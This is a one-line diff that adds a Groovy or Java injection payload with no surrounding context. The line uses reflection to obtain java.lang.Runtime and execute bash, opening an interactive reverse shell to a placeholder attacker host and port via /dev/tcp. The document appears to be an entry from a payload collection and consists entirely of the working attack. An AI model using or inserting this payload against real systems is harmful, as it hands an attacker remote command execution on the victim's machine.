@@ -1,0 +1,1 @@
+java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec(["/bin/bash", "-c", "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"] as String[]).getText()
